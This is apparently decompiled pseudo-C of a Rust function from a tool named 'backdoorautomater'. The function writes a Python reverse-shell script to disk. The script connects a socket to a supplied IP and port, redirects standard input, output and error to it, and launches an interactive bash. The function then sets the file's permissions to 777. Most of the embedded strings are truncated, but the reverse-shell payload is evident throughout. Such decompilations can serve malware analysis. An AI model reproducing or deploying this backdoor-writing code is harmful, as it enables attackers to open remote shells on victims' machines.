
  char const (**)[0x94] backdoorautomater::shellscript::write_shell_pyfile::h0bdea7fe03ab2920(int64_t* arg1, int64_t* arg2, int64_t* arg3)

{
    int32_t var_130;
    std::fs::File::create::he97042899d0016f9(&var_130, arg3);
    char const (** result)[0x94];
    
    if (!var_130)
    {
        int32_t fd_1;
        int32_t fd = fd_1;
        char const (** result_2)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "import socket,subprocess,os;\ns=…", 0x1d);
        result = result_2;
        
        if (result_2)
            goto label_45f49f;
        
        char const (** result_3)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "s=socket.socket(socket.AF_INET,s…", 0x34);
        result = result_3;
        
        if (result_3)
            goto label_45f49f;
        
        var_130 = "v_ip='os.dup2(s.fileno(),0);\nos…";
        int64_t var_128 = 6;
        int128_t var_120_1 = *(arg2 + 8);
        int128_t var_1a8;
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
        int128_t var_1e8 = var_1a8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1e8, 
            "';\nimport socket,subprocess,os;…", 3);
        uint64_t var_198;
        char const (** result_4)[0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1e8[8], var_198);
        result = result_4;
        
        if (result_4)
            goto label_45f496;
        
        var_130 = "s.connect((v_ip,src/cronshell.rs…";
        int64_t var_128_1 = 0x10;
        int128_t var_120_2 = *(arg1 + 8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
        int128_t var_1c8 = var_1a8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1c8, 
            "));\n$i='kindNoneSomeZeroIpv4Ipv…", 4);
        char const (** result_5)[0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1c8[8], var_198);
        result = result_5;
        
        if (result_5)
        {
            label_45f48c:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            label_45f496:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1e8);
            label_45f49f:
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            char const (** result_6)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "os.dup2(s.fileno(),0);\nos.dup2(…", 0x17);
            result = result_6;
            
            if (result_6)
                goto label_45f48c;
            
            char const (** result_7)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "os.dup2(s.fileno(),1);\nos.dup2(…", 0x17);
            result = result_7;
            
            if (result_7)
                goto label_45f48c;
            
            char const (** result_8)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "os.dup2(s.fileno(),2);\nv_shell_…", 0x17);
            result = result_8;
            
            if (result_8)
                goto label_45f48c;
            
            char const (** result_9)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "v_shell_path='/usr/bin/bash';\nv…", 0x1e);
            result = result_9;
            
            if (result_9)
                goto label_45f48c;
            
            char const (** result_10)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "v_shell_value='-i';\np=subproces…", 0x14);
            result = result_10;
            
            if (result_10)
                goto label_45f48c;
            
            char const (** result_11)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "p=subprocess.call([v_shell_path,…", 0x31);
            result = result_11;
            
            if (result_11)
                goto label_45f48c;
            
            int64_t zmm0_5 = *(arg3 + 8);
            var_130 = "chmod 777 sh-cFailed to execute …";
            int64_t var_128_2 = 0xa;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
            int128_t zmm0_6 = var_1a8;
            std::process::Command::new::hc59b10cf3f1b2ada(&var_130, 
                "sh-cFailed to execute commandsrc…");
            int64_t rbp;
            rbp = 1;
            int64_t* rax_6 = std::process::Command::arg::ha1bca970e684ecbe(&var_130, 
                "-cFailed to execute commandsrc/s…");
            uint64_t var_198_1 = var_198;
            var_1a8 = zmm0_6;
            std::process::Command::arg::hc1c88ee68029addc(rax_6, &var_1a8);
            std::process::Command::output::hf2f7777b705db8a9(&var_1a8);
            void var_60;
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_60, &var_1a8);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_130);
            int64_t var_40;
            size_t var_38;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_1a8, var_40, var_38);
            int64_t rax_7;
            uint64_t rdx_6;
            rax_7 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_1a8);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_130, rax_7, rdx_6);
            int64_t var_138_1 = zmm0_5;
            int128_t var_148 = var_130;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_1a8);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_148);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1e8);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            result = nullptr;
        }
    }
    else
    {
        char const (** result_1)[0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
